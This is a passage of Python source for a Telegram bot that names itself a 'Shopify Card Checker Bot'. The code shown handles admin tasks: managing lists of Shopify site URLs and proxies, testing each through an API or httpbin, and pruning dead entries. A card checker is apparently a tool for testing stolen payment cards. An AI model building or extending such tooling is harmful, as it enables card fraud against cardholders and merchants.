            buttons=[[Button.inline("🔙 Back", b"admin_gen_keys")]],
            parse_mode='md'
        )


# ========== ADMIN: SITE MANAGEMENT ==========

@bot.on(events.CallbackQuery(pattern=b"site_add"))
async def site_add_callback(event):
    """Start add site session"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    active_sessions[event.sender_id] = {'action': 'site_add'}

    await event.edit(
        "➕ **Add Site**\n\n"
        "Send the site URL:\n\n"
        "Or click Back to cancel.",
        buttons=[[Button.inline("🔙 Back", b"admin_sites")]],
        parse_mode='md'
    )


async def handle_site_add(event, site_url: str):
    """Add a site"""
    user_id = event.sender_id
    site_url = site_url.strip()

    # Clear session
    active_sessions.pop(user_id, None)

    sites = await load_lines(SITES_FILE)
    if site_url not in sites:
        sites.append(site_url)
        await save_lines(SITES_FILE, sites)
        await event.respond(f"✅ Site added: {site_url}")
    else:
        await event.respond(f"⚠️ Site already exists: {site_url}")


@bot.on(events.CallbackQuery(pattern=b"site_remove"))
async def site_remove_callback(event):
    """Start remove site session"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    active_sessions[event.sender_id] = {'action': 'site_remove'}

    await event.edit(
        "➖ **Remove Site**\n\n"
        "Send the site URL to remove:\n\n"
        "Or click Back to cancel.",
        buttons=[[Button.inline("🔙 Back", b"admin_sites")]],
        parse_mode='md'
    )


async def handle_site_remove(event, site_url: str):
    """Remove a site"""
    user_id = event.sender_id
    site_url = site_url.strip()

    # Clear session
    active_sessions.pop(user_id, None)

    sites = await load_lines(SITES_FILE)
    if site_url in sites:
        sites.remove(site_url)
        await save_lines(SITES_FILE, sites)
        await event.respond(f"✅ Site removed: {site_url}")
    else:
        await event.respond(f"⚠️ Site not found: {site_url}")


@bot.on(events.CallbackQuery(pattern=b"site_test"))
async def site_test_callback(event):
    """Test all sites"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    sites = await load_lines(SITES_FILE)
    if not sites:
        await event.answer("❌ No sites to test", alert=True)
        return

    progress_msg = await event.edit(
        f"🔍 **Testing Sites**\n\n"
        f"Total: {len(sites)}\n"
        f"Progress: 0/{len(sites)} (0%)\n"
        f"[░░░░░░░░░░] 0%\n\n"
        f"✅ Working: 0\n"
        f"❌ Dead: 0\n"
        f"⚠️ Error: 0",
        parse_mode='md'
    )

    working = []
    dead = []
    errors = []

    for i, site in enumerate(sites):
        try:
            params = {'url': site, 'test': 'true'}
            result = await call_api('/shopify', params)

            if result.get('Status'):
                working.append(site)
            else:
                dead.append(site)
        except Exception:
            errors.append(site)

        # Update progress every 2 sites
        if (i + 1) % 2 == 0 or (i + 1) == len(sites):
            progress = ((i + 1) / len(sites)) * 100
            bar_filled = int(progress / 10)
            bar = '█' * bar_filled + '░' * (10 - bar_filled)

            try:
                await progress_msg.edit(
                    f"🔍 **Testing Sites**\n\n"
                    f"Total: {len(sites)}\n"
                    f"Progress: {i+1}/{len(sites)} ({progress:.1f}%)\n"
                    f"[{bar}] {progress:.0f}%\n\n"
                    f"✅ Working: {len(working)}\n"
                    f"❌ Dead: {len(dead)}\n"
                    f"⚠️ Error: {len(errors)}",
                    parse_mode='md'
                )
            except Exception:
                pass

    # Remove dead sites
    if dead or errors:
        new_sites = [s for s in sites if s not in dead and s not in errors]
        await save_lines(SITES_FILE, new_sites)

    await progress_msg.edit(
        f"✅ **Site Testing Complete**\n\n"
        f"Total: {len(sites)}\n"
        f"✅ Working: {len(working)}\n"
        f"❌ Dead: {len(dead)} (removed)\n"
        f"⚠️ Error: {len(errors)} (removed)\n\n"
        f"Sites file updated.",
        buttons=[[Button.inline("🔙 Back", b"admin_sites")]],
        parse_mode='md'
    )


# ========== ADMIN: PROXY MANAGEMENT ==========

@bot.on(events.CallbackQuery(pattern=b"proxy_add"))
async def proxy_add_callback(event):
    """Start add proxy session"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    active_sessions[event.sender_id] = {'action': 'proxy_add'}

    await event.edit(
        "➕ **Add Proxy**\n\n"
        "Send proxy in format:\n`ip:port:user:pass` or `ip:port`\n\n"
        "Or click Back to cancel.",
        buttons=[[Button.inline("🔙 Back", b"admin_proxies")]],
        parse_mode='md'
    )


async def handle_proxy_add(event, proxy: str):
    """Add a proxy"""
    user_id = event.sender_id
    proxy = proxy.strip()

    # Clear session
    active_sessions.pop(user_id, None)

    proxies = await load_lines(PROXY_FILE)
    if proxy not in proxies:
        proxies.append(proxy)
        await save_lines(PROXY_FILE, proxies)
        await event.respond(f"✅ Proxy added: {proxy}")
    else:
        await event.respond(f"⚠️ Proxy already exists")


@bot.on(events.CallbackQuery(pattern=b"proxy_test"))
async def proxy_test_callback(event):
    """Test all proxies"""
    if not await is_admin(event.sender_id):
        await event.answer("❌ Unauthorized", alert=True)
        return

    proxies = await load_lines(PROXY_FILE)
    if not proxies:
        await event.answer("❌ No proxies to test", alert=True)
        return

    await event.edit(
        f"🔍 Testing {len(proxies)} proxies...\n"
        f"This may take a while.",
        parse_mode='md'
    )

    # Simple test - just check if we can make a request
    working = []

    for proxy in proxies:
        try:
            # Test with httpbin
            timeout = aiohttp.ClientTimeout(total=10)
            proxy_url = f"http://{proxy}" if '://' not in proxy else proxy

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get('http://httpbin.org/ip', proxy=proxy_url) as resp:
                    if resp.status == 200:
                        working.append(proxy)
        except Exception:
            pass

    # Save working proxies
    await save_lines(PROXY_FILE, working)

    await event.edit(
        f"✅ **Proxy Testing Complete**\n\n"
        f"Total: {len(proxies)}\n"
        f"✅ Working: {len(working)}\n"
        f"❌ Dead: {len(proxies) - len(working)} (removed)\n\n"
        f"Proxy file updated.",
        buttons=[[Button.inline("🔙 Back", b"admin_proxies")]],
        parse_mode='md'
    )


# ========== MAIN ==========

async def main():
    """Start the bot"""
    print("🤖 Starting Shopify Card Checker Bot...")

    # Start health check loop
    asyncio.create_task(health_check_loop())

    print("✅ Bot is running!")
    await bot.run_until_disconnected()


if __name__ == '__main__':
    asyncio.run(main())
